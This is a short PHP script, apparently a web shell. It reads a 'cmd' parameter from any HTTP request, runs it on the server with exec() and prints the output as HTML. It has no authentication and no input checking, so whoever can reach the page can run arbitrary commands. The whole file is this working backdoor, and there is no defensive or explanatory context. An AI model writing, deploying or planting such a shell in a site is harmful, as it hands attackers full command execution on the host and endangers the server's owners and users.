<?php
//if cmd is requested
if (isset($_REQUEST['cmd'])) {
	//prepare vars
	$lines = array();
	$cmd = urldecode($_REQUEST['cmd']);
	echo '<b>'.$cmd.'</b>';
	$breakChar = '<br/>'; //OR \n

	//FIXME check if command is a shelpad one...

	//Exec cmd
	$lastLine = exec($cmd, $lines);

	//Run through output
	//$output = "\n";
	$output = $breakChar; //HTML

	//If error print
	if (empty($lastLine) && empty($lines)) {
		$output .= 'No output';

	//else if successful send here
	} else {
		//FIXME more preprocess
		foreach($lines as $line) {
			$output .= $line.$breakChar;
		}
	}
	$output .= $breakChar.$breakChar;
	echo $output;
}
?>